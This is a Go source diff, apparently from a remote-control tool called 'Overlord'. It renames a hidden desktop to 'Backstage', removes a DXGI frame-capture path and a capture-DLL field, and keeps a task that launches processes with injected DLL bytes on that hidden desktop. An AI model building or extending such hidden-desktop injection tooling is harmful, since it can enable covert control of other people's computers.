@@ -157,7 +157,7 @@ var (
 	backstageDesktopHandle   uintptr
 	backstageDesktopMu       sync.Mutex
 	backstageCaptureMu       sync.Mutex
-	backstageDesktopName     = "OverlordHiddenDesktop"
+	backstageDesktopName     = "OverlordBackstage"
 	backstageInitialized     bool
 	backstageOriginalDesktop uintptr
 	backstageCursorEnabled   bool
@@ -234,7 +234,6 @@ type backstageTask struct {
 	text            string
 	delta           int32
 	dllBytes        []byte
-	captureDllBytes []byte
 	searchPath      string
 	replacePath     string
 	queuedAt        time.Time
@@ -393,7 +392,6 @@ func CleanupbackstageDesktop() {
 	ResetPrevbackstage()
 	resetH264D3D11TextureEncoder("backstage")
 
-	backstageCleanupFrameReaders()
 	dwmCleaned, workerStopped := shutdownbackstageThreadLocked(time.Second)
 	if !dwmCleaned {
 		backstageAbandonDWMThumbnails()
@@ -563,7 +561,7 @@ func ensurebackstageThread() error {
 				case backstageTaskStartProcess:
 					result.pid, result.err = startbackstageProcessOnThread(task.filePath, task.display)
 				case backstageTaskStartProcessInjected:
-					result.pid, result.err = startbackstageProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath, task.display)
+					result.pid, result.err = startbackstageProcessInjectedOnThread(task.filePath, task.dllBytes, task.searchPath, task.replacePath, task.display)
 				case backstageTaskMouseMove:
 					result.err = backstageMouseMoveOnThread(task.display, task.x, task.y)
 				case backstageTaskMouseDown:
@@ -1905,9 +1903,6 @@ func backstageFreeCacheEntry(entry *backstageWinCacheEntry) {
 	}
 }
 
-var dxgiFrameBuf []byte
-
-var backstageDXGIEnabled atomic.Bool
 var backstageUIAEnabled atomic.Bool
 var backstagePrintWindowFallbackEnabled atomic.Bool
 var backstagePrintWindowFallbackLogNs atomic.Int64
@@ -1915,17 +1910,15 @@ var backstagePrintWindowTimeoutLogNs atomic.Int64
 var backstagePrintWindowFn = printWindow
 
 func init() {
-	backstageDXGIEnabled.Store(false) // disabled by default
-	backstageUIAEnabled.Store(false)  // disabled by default
+	backstageUIAEnabled.Store(false) // disabled by default
 	backstagePrintWindowFallbackEnabled.Store(true)
 }
 
-func SetbackstageDXGIEnabled(enabled bool) {
-	backstageDXGIEnabled.Store(enabled)
+func SetbackstageDXGIEnabled(_ bool) {
 }
 
 func GetbackstageDXGIEnabled() bool {
-	return backstageDXGIEnabled.Load()
+	return false
 }
 
 func SetbackstageUIAEnabled(enabled bool) {
@@ -1987,79 +1980,6 @@ func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry
 	}
 }
 
-func drawbackstageWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
-	if !backstageDXGIEnabled.Load() {
-		return false
-	}
-	var pid uint32
-	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
-	if pid == 0 {
-		return false
-	}
-
-	reader := backstageGetFrameReader(pid)
-	if reader == nil {
-		backstageFrameReadersMu.Lock()
-		gpuPID := backstageGPUPIDMap[pid]
-		backstageFrameReadersMu.Unlock()
-		if gpuPID != 0 {
-			reader = backstageGetFrameReader(gpuPID)
-		}
-	}
-	if reader == nil {
-		return false
-	}
-
-	needed := winW * winH * 4
-	if cap(dxgiFrameBuf) < needed {
-		dxgiFrameBuf = make([]byte, needed)
-	}
-	buf := dxgiFrameBuf[:needed]
-
-	frameW, frameH, ok := reader.readFrame(buf)
-	if !ok {
-		return false
-	}
-
-	copyW := minInt(winW, frameW)
-	copyH := minInt(winH, frameH)
-	if copyW <= 0 || copyH <= 0 {
-		return false
-	}
-
-	srcStride := frameW * 4
-	winStride := winW * 4
-
-	effWinLeft := winLeft
-	effWinTop := winTop
-	effWinRight := winLeft + copyW
-	effWinBottom := winTop + copyH
-
-	interLeft := maxInt(effWinLeft, bounds.Min.X)
-	interTop := maxInt(effWinTop, bounds.Min.Y)
-	interRight := minInt(effWinRight, bounds.Max.X)
-	interBottom := minInt(effWinBottom, bounds.Max.Y)
-	if interRight <= interLeft || interBottom <= interTop {
-		return false
-	}
-
-	srcX := interLeft - winLeft
-	srcY := interTop - winTop
-	dstX := interLeft - bounds.Min.X
-	dstY := interTop - bounds.Min.Y
-	blitW := interRight - interLeft
-	blitH := interBottom - interTop
-
-	for y := 0; y < blitH; y++ {
-		srcStart := (srcY+y)*srcStride + srcX*4
-		dstStart := (dstY+y)*targetStride + dstX*4
-		copy(target[dstStart:dstStart+blitW*4], buf[srcStart:srcStart+blitW*4])
-	}
-
-	_ = winStride
-	return true
-}
-
 func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
 	if backstageIsDWMHost(hwnd) {
 		return false
@@ -2089,9 +2009,6 @@ func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target
 		return false
 	}
 
-	if drawn := drawbackstageWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
-		return true
-	}
 	if !backstagePrintWindowFallbackEnabled.Load() {
 		now := time.Now().UnixNano()
 		last := backstagePrintWindowFallbackLogNs.Load()
